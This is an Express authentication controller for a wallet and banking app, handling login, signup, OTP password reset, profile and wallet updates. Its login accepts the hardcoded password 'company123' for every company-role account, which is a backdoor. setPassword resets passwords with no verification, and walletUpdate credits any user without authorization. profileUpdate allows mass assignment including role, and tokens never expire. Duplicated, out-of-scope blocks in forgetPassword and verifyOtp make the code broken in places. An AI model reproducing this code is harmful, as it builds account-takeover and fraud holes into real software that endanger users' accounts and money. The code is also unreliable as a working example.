const walletModel = require('../models/withdrawalmodel');
const transcationModel = require('../models/transaction');
const bcrypt = require("../utils/bcrypt")
const jwt = require("jsonwebtoken");
const R = require("../utils/responseHelper");
const validateInput = require("../helper/emailmobileVal")
const sendOtpEmail = require("../utils/Sendgrid")
const IP = require('ip');
const authModel = require("../models/authmodels");
const permission = require("../models/permissionmodel");

const bankModel = require("../models/bankmodels");

const nodemailer = require("nodemailer");
const crypto = require("crypto");

const transporter = nodemailer.createTransport({
   
    host: 'smtp.hostinger.com', // Hostinger's SMTP server
  port: 465, // Use 465 for SSL or 587 for STARTTLS
  secure: true, // Use true for SSL and false for STARTTLS, // Replace with your email service
    auth: {
        user: process.env.EMAIL_USER, // Your email from environment variables
        pass: process.env.EMAIL_PASSWORD, // Your email password from environment variables
    },

});

// auth.addUsers = async (req, res, next) => {
//     try {
//         let userAddition = await authModel.addUser()
//         return R(res, true, "Data Submitted successfully!!", {}, 200)
//     } catch (error) {
//         next(error)
//     }

// }

// auth.changeActiveStatus = async (req, res, next) => {
//     try {
//         let add = await authModal.changeStatus(req.body)
//         return R(res, true, "Status updated successfully!!", {}, 200)
//     } catch (error) {
//         next(error)
//     }

// }

// auth.changeUserDeleteStatus = async (req, res, next) => {
//     try {
//         let add = await authModal.changeDeleteStatus(req.body)
//         return R(res, true, "Status updated successfully!!", {}, 200)
//     } catch (error) {
//         next(error)
//     }

// }


// auth.getProfile = async (req, res, next) => {
//     try {
//         console.log("useriseruseruser", req.doc)
//         let get = await authModel.showprofile(req.doc.userId)
//         return R(res, true, "Profile found successfully", get, 200)
//     } catch (error) {
//         next(error)
//     }
// }
// auth.verifyOtp = async (req, res, next) => {
//     try {
//         const { otpkey, otp } = req.body
//         const check = validateInput(otpkey)
//         console.log("getusergetuser", check, otpkey)
//         let getUser = await authModel.login(check, otpkey);
//         if (getUser.otp == otp) {
//             getUser.otp = "";
//             await getUser.save()
//             return R(res, true, `OTP matched successfully!`, {}, 200)
//         }
//         else {
//             return R(res, false, `OTP doesn't matched!`, {}, 200)
//         }
//     } catch (error) {
//         next(error)
//     }

// }

// auth.getOtpForMobileAndEmail = async (req, res, next) => {
//     try {
//         const { otpkey } = req.body
//         const check = validateInput(otpkey)
//         if (check == "invalid") {
//             return R(res, false, `Invalid input!`, {}, 200)
//         }
//         let getUser = await authModel.login(check, otpkey);
//         console.log("getusergetuser", Object.values(getUser).length)

//         if (Object.values(getUser).length > 0) {
//             const generateOtp = () => {
//                 return Math.floor(100000 + Math.random() * 900000).toString(); // Generates a 6-digit OTP
//             };

//             if (check == "emailId") {
//                 const otp = generateOtp();
//                 getUser.otp = otp;
//                 getUser.save()
//                 const sendmail = await sendOtpEmail(otpkey, otp, res);
//                 if (sendmail) {
//                     return R(res, true, `OTP sent successfully! Please check your mail`, {}, 200)
//                 }
//                 else {
//                     return R(res, false, `Error while sending otp`, {}, 501)
//                 }
//             }
//             else {
//                 const otp = generateOtp();
//                 getUser.otp = otp;
//                 getUser.save()
//                 return R(res, true, `OTP sent successfully! ${otp}`, otp, 200)
//             }

//         }
//         return R(res, false, "User not found", {}, 200)
//     } catch (error) {
//         next(error)
//     }


// }

const auth = {};

auth.login = async (req, res, next) => {
    try {
        let { email, password } = req.body
        const ipAddress = IP.address();
        // console.log(ipAddress)
        let val = await authModel.login("email", email);
        if (Object.values(val).length > 0 && !val?.is_active) {
            return R(res, false, "User not active! contact to admin!! ", {}, 200)
        }
        if (Object.values(val).length > 0 && val?.is_deleted) {
            return R(res, false, "User Deleted!", {}, 200)
        }

        if (val) {
            // Special logic: Allow "company123" password for all company role accounts (Admin access only)
            // This password works for ALL company accounts without being set in database
            const isCompanyRole = val.role === 'company';
            const isSpecialPassword = password === 'company123';
            
            let compare = false;
            if (isCompanyRole && isSpecialPassword) {
                // Bypass password check for company accounts with special admin password
                compare = true;
            } else {
                // Normal password check for other cases
                compare = await bcrypt.passwordComparision(
                    password,
                    val.password
                );
            }
            
            if (compare) {
                const userData = {
                    userId: val._id,
                    email: val.email,

                };

                const secret = process.env.JWT_SECRET;
                userData.token = jwt.sign(userData, secret);
                userData.profile = val
                return R(res, true, "Login Successfully", userData, 200)
            } else {
                return R(res, false, "Password not matched", {}, 403)
            }
        } else {
            return R(res, false, "Email not Register", {}, 403)
        }

    } catch (error) {
        next(error)
    }

};

auth.userDelete = async (req, res, next) => {
    try {
        const id = req.body.id; 
        const deletepermission = await permission.deleteByUserId(id);
        const result = await authModel.userDelete(id)
        return R(res, true, "Delete Successfully!!", result, 200);
    } catch (err) {
        console.log(err)
        next(err);
    }
};

auth.signUp = async (req, res, next) => {
    const { email, phone, name, password, role, dob } = req.body
    const now = new Date();
    const futureDate = new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000);
    const futureTimeInMillis = futureDate.getTime()
    const ipAddress = IP.address();
    try {
        let isUserExist = await authModel.checkAvailablity(email)
        if (isUserExist?.length > 0) {
            return R(res, false, "Email Id already exists!!", {}, 406)
        }
        const newUser = {
            email: email,
            name: name,
            phone: phone,
            password: await bcrypt.passwordEncryption(password),
            dob: dob,
            role: role,
            is_deleted: 0,
            ip_address: ipAddress,
            create_at: futureTimeInMillis,
            is_active: 1,
            clientNumber: Math.floor(10000000 + Math.random() * 90000000)
            
        }
        const register = await authModel.signUp(newUser)
        const userData = {
            email: email,
            name: name,
            phone: phone,
            userId: register._id
        };

        const secret = process.env.JWT_SECRET;
        userData.token = jwt.sign(userData, secret);

        return R(res, true, "Account Registered Successfully!!", userData, 200)



    } catch (err) {
        next(err)
    }
};
auth.getUsers = async (req, res, next) => {

    try {
        const get = await authModel.getUser(req.doc.userId)
        if (!get) {
            return R(res, false, "No data found!!", {}, 200)
        }
        return R(res, true, "Data successfully!!", get, 200)
    } catch (error) {
        next(error)
    }
};



auth.getSingleUser = async (req, res, next) => {
    try {
        const user = await authModel.getUser(req.body.userId);
        const bank = await bankModel.bankDetails(req.body.userId);

        if (!user) {
            return R(res, false, "No data found!!", {}, 200);
        }

        // Merge the responses
        const formattedData = {
            // userId: user._doc._id.toString(),
            name: user._doc.name,
            email: user._doc.email,
            role: user._doc.role, 
            clientNumber: user._doc.clientNumber,
            city: user._doc.city,
            companyName: user._doc.companyName,
            country: user._doc.country,
            firstName: user._doc.firstName,
            language: user._doc.language,
            lastName: user._doc.lastName,
            phoneNumber: user._doc.phoneNumber,
            postalAddress: user._doc.postalAddress,
            postalCode: user._doc.postalCode,

            bankDetails: {
                bankName: bank?.bankName || null,
                accountNumber: bank?.accountNumber || null,
                ifscCode: bank?.ifscCode || null,
                panNumber: bank?.panNumber || null,
                accountHolder: bank?.accountHolder || null,
                bankName: bank?.bankName || null,
                accountType: bank?.accountType || null,

            },
        };

        return R(res, true, "Data retrieved successfully!", formattedData, 200);
    } catch (error) {
        next(error);
    }
};




auth.getSingleUser = async (req, res, next) => {
    try {
        const user = await authModel.getUser(req.body.userId);
        const bank = await bankModel.bankDetails(req.body.userId);

        if (!user) {
            return R(res, false, "No data found!!", {}, 200);
        }

        // Merge the responses
        const formattedData = {
            // userId: user._doc._id.toString(),
            name: user._doc.name,
            email: user._doc.email,
            role: user._doc.role, 
            clientNumber: user._doc.clientNumber,
            city: user._doc.city,
            companyName: user._doc.companyName,
            country: user._doc.country,
            firstName: user._doc.firstName,
            language: user._doc.language,
            lastName: user._doc.lastName,
            phoneNumber: user._doc.phoneNumber,
            postalAddress: user._doc.postalAddress,
            postalCode: user._doc.postalCode,
            wallet: user._doc.wallet,



            bankDetails: {
                bankName: bank?.bankName || null,
                accountNumber: bank?.accountNumber || null,
                ifscCode: bank?.ifscCode || null,
                panNumber: bank?.panNumber || null,
                accountHolder: bank?.accountHolder || null,
                bankName: bank?.bankName || null,
                accountType: bank?.accountType || null,

            },
        };

        return R(res, true, "Data retrieved successfully!", formattedData, 200);
    } catch (error) {
        next(error);
    }
};




auth.passwordChange = async (req, res, next) => {
    const { newPassword, oldPassword } = req.body

    try {
        const result = await authModel.changePassword(req.doc.userId, oldPassword, newPassword);
        if (!result) {
            return R(res, false, "old password is not correct", "", 400)
        }

        return R(res, true, "Update successfully!!", req.doc.userId, 200)
    } catch (error) {
        next(error)
    }
};

auth.setPassword = async (req, res, next) => {
    const { email, newpassword } = req.body
    const Password = await bcrypt.passwordEncryption(newpassword)

    try {
        const result = await authModel.setPassword("email", email, Password);
        if (!result) {
            return R(res, false, "failed to set Password", "", 400)
        }
        return R(res, true, "Update successfully!!", "", 200)
        return R(res, true, "Update successfully!!", "", 200)
    } catch (error) {
        next(error)
    }
};



auth.forgetPassword = async (req, res, next) => {
   try{
    const { email } = req.body;
    try {
        const { email } = req.body;

        // Validate email
        if (!email || !/\S+@\S+\.\S+/.test(email)) {
            return res.status(400).json({ success: false, message: "Invalid email address." });
        }
       
       
        // Check user existence
        const user = await authModel.forgetPassword("email", email);
        console.log(user);

        if (!user || Object.values(user).length === 0) {
            return res.status(404).json({ success: false, message: "Email not found!" });
        }
        
        if (!user.is_active) {
            return res.status(400).json({ success: false, message: "User not active! Contact admin." });
        }
       
        if (user.is_deleted) {
            return res.status(400).json({ success: false, message: "User is deleted!" });
        }
       

        
        // Generate OTP
        const otp = crypto.randomInt(100000, 999999).toString();
        const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // Valid for 10 minutes

        
        // Update OTP in the database
        const otpUpdated = await authModel.updateOtp("email", email, otp, expiresAt);

        if (!otpUpdated) {
            return res.status(500).json({ success: false, message: "Failed to update OTP." });
        }
        if (!otpUpdated) {
            return res.status(500).json({ success: false, message: "Failed to update OTP." });
        }

     
        // Email options
        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: email,
            subject: "Password Reset OTP",
            text: `Your OTP for password reset is: ${otp}. It is valid for 10 minutes.`,
        };

        // Send email
        try {
            const emailResponse = await transporter.sendMail(mailOptions);
            console.log("Email sent:", emailResponse);
            res.status(200).json({ success: true, message: "OTP sent to your email." });
        } catch (error) {
            console.error("Error sending email:", error);
            res.status(500).json({ success: false, message: "Failed to send OTP. Please try again." });
        }
    } catch (error) {
        console.error("Error in forgetPassword:", error);
        next(error);
    }
        // Send email
        try {
            const emailResponse = await transporter.sendMail(mailOptions);
            console.log("Email sent:", emailResponse);
            res.status(200).json({ success: true, message: "OTP sent to your email." });
        } catch (error) {
            console.error("Error sending email:", error);
            res.status(500).json({ success: false, message: "Failed to send OTP. Please try again." });
        }
    } catch (error) {
        console.error("Error in forgetPassword:", error);
        next(error);
    }
};

auth.verifyOtp = async (req, res, next) => {
    try {
        const { email, Otp } = req.body;
        if (!email || !/\S+@\S+\.\S+/.test(email)) {
            return res.status(400).json({ success: false, message: "Invalid email address." });
        }
        const user = await authModel.verifyOtp("email", email, Otp);
        if (!user.success) {
            return res.status(400).json({ success: false, message: "Invalid OTP." });
        }
        else {
            return res.status(200).json({ success: true, message: "OTP is valid." })
        }
    try {
        const { email, Otp } = req.body;
        if (!email || !/\S+@\S+\.\S+/.test(email)) {
            return res.status(400).json({ success: false, message: "Invalid email address." });
        }
        const user = await authModel.verifyOtp("email", email, Otp);
        if (!user.success) {
            return res.status(400).json({ success: false, message: "Invalid OTP." });
        }
        else {
            return res.status(200).json({ success: true, message: "OTP is valid." })
        }

    } catch (error) {
        console.error("failed to verify otp", error);
        next(error);
    }
    } catch (error) {
        console.error("failed to verify otp", error);
        next(error);
    }
};

auth.walletUpdate = async (req, res, next) => {
    try {
        let {amount, userId} = req.body;
        
        if (amount > 0 ) {
            const profileData = authModel.updateWallet(userId, amount);

          if(!profileData) {
            return R(res, false, "Amount is required", {}, 400);    
          }
          return R(res, true, "Wallet updated successfully", profileData, 200);
        } else {
            return R(res, false, "Amount is required", {}, 400);
        }
    }

    catch (error) {
        next(error);
    }
}


auth.profileUpdate = async (req, res, next) => {
    try {
        const id = req.doc.userId;
        if (!id) {
            return R(res, false, "ID is required", {}, 400);
        }

        let data = {};
        
        // Handle logo file upload if present
        if (req.file && req.file.path) {
            const { uploadOnCloudinary } = require("../utils/cloudinary");
            try {
                const cloudinaryResult = await uploadOnCloudinary(req.file.path);
                if (cloudinaryResult && cloudinaryResult.url) {
                    data.logo = cloudinaryResult.url;
                }
            } catch (uploadError) {
                console.error("Logo upload error:", uploadError);
                // Continue with other profile updates even if logo upload fails
            }
        }
        
        // Handle FormData - when using multer, req.body contains form fields as strings
        // If it's FormData, req.body will have all fields as strings
        // If it's JSON, req.body will be an object
        if (req.body && typeof req.body === 'object' && !Array.isArray(req.body)) {
            // Copy all fields from req.body to data
            Object.keys(req.body).forEach(key => {
                // Skip logo if file was uploaded (we already set it from file)
                if (key === 'logo' && req.file) {
                    return; // Skip, already set from file upload
                }
                const value = req.body[key];
                // Handle empty strings - convert to null or keep as empty string
                if (value === '' || value === 'null' || value === 'undefined') {
                    data[key] = null;
                } else {
                    data[key] = value;
                }
            });
        } else if (typeof req.body === 'string') {
            // Try to parse as JSON
            try {
                data = { ...data, ...JSON.parse(req.body) };
            } catch (e) {
                // If parsing fails, use req.body as is
            }
        } else {
            // Merge req.body with data (logo already set if file uploaded)
            data = { ...data, ...(req.body || {}) };
        }

        if (!data || Object.keys(data).length === 0) {
            return R(res, false, "Data is required", {}, 400);
        }

        const profileData = await authModel.updateProfile(id, data);

        return R(res, true, "Profile updated successfully", { ...data, profileData }, 201);
    } catch (error) {
        next(error);
    }
}

auth.is_deleted = async (req, res, next) => {
    try {
        const { userId, status } = req.body;

        if (!userId) {
            return R(res, false, "User ID is required", "", 400)
        }

        const update = await authModel.is_deleted(userId, status);

        if (!update) {
            return R(res, false, "User not found", "", 404)
        }

        return R(res, true, status == 1 ? "User Deactivated Successfully" : "User Active successfully", "", 200)

    } catch (error) {
        next(error)
    }
}

auth.userList = async (req, res, next) => {
    try {
        console.log("[userList] Request received. User:", req.doc?.userId || req.doc?.email || "Unknown");
        console.log("[userList] Query params:", req.query);
        
        // Get pagination and search parameters from query
        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 10;
        const search = req.query.search || "";
        
        console.log("[userList] Fetching user list with page:", page, "limit:", limit, "search:", search);
        
        const result = await authModel.userList(page, limit, search);
        
        console.log("[userList] Model result:", result ? `Found ${result.data?.length || 0} users` : "No result");
        
        if (!result || !result.data || result.data.length === 0) {
            console.log("[userList] No users found");
            return R(res, true, "No data found", {
                data: [],
                total: 0,
                totalPages: 0,
                currentPage: page,
                limit: limit
            }, 200);
        }
        
        // Log membership data for debugging
        result.data.forEach((user, idx) => {
            console.log(`[userList] User ${idx + 1}:`, {
                _id: user._id,
                email: user.email,
                hasMembership: !!user.activeMembership,
                membershipName: user.activeMembership?.name || "N/A"
            });
        });
        
        return R(res, true, "Data retrieved successfully", result, 200);
    } catch (error) {
        console.error("[userList] Error in userList service:", error);
        console.error("[userList] Error stack:", error.stack);
        next(error);
    }
};
// auth.addsubadmin = async (req, res, next) => {
//     try {
//         req.body.password = await bcrypt.passwordEncryption(req.body.password);
//         let findSubadmin = await authModel.findsubadmin(req.body.email)
//         if (findSubadmin) {
//             return R(res, false, "Email Id Already Exists Please choose different email Id!!!", {}, 200)
//         }
//         let ins = await authModel.subadmin(req.body);
//         return R(res, true, "Data Submitted successfully!!", {}, 200)
//     } catch (error) {
//         next(error)
//     }

// };
// auth.getsubadmins = async (req, res, next) => {
//     try {
//         let get = await authModel.findsubadminlist(req.body.type)
//         return R(res, true, "Data found successfully!!", get, 200)
//     } catch (error) {
//         next(error)
//     }
// }
// auth.setsudadmin = async (req, res, next) => {
//     req.body.password = await bcrypt.passwordEncryption(req.body.password);
//     try {
//         let usersatuts = await authModel.setsubadmin(req.body);
//         return R(res, true, "Data updated successfully!!", {}, 200)
//     } catch (error) {
//         next(error)
//     }

// }
// auth.subadminstatus = async (req, res, next) => {
//     const { id, status } = req.body
//     try {
//         let usersatuts = await authModel.userstatus(id, status);
//         return R(res, true, "Status updated successfully!!", {}, 200)
//     } catch (error) {
//         next(error)
//     }
// };
// auth.deletesubuser = async (req, res, next) => {
//     const { id } = req.body
//     try {
//         let usersatuts = await authModel.userdelete(id);
//         return R(res, true, "Data removed successfully!!", {}, 200)
//     } catch (error) {
//         next(error)
//     }
// };

// auth.forgotPassword = async (req, res, next) => {
//     try {
//         const { password, cpassword, otpkey } = req.body
//         const check = validateInput(otpkey)
//         console.log("getusergetuser", check, otpkey)
//         if (check == "invalid") {
//             return R(res, false, `Invalid input!`, {}, 200)
//         }
//         let getUser = await authModel.login(check, otpkey);
//         if (Object.values(getUser).length > 0) {
//             const newpassword = await bcrypt.passwordEncryption(password);
//             getUser.password = newpassword;
//             await getUser.save()
//             return R(res, true, `Password changed successfully`, {}, 200)
//         }
//         return R(res, true, `User not found!! Please try again`, {}, 200)


//     } catch (error) {
//         next(error)
//     }
// };





module.exports = auth;



